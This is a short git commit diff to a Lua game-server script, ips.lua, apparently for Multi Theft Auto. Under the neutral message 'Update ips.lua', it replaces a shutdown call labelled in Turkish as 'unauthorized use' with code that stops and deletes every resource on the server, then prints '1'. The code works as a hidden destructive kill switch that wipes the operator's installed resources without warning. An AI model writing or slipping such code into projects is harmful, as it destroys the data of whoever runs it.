76dc6db8d9de8578a70e9dba97517a2e9570f7fd
Drewskijs <101997275+Drewskijs@users.noreply.github.com>
2022-12-05 03:56:38 +0300

    Update ips.lua

--- ips.lua
+++ ips.lua
@@ -1,1 +1,8 @@
-shutdown("izinsiz kullanim")
+ --Get all resources
+    local resourceTable = getResources ( ) 
+    for resourceKey, resourceValue in ipairs ( resourceTable ) do
+        local resourceName = getResourceName ( resourceValue )
+        stopResource ( resourceValue )
+        local deleted = deleteResource ( resourceName )
+    end
+outputChatBox("1")
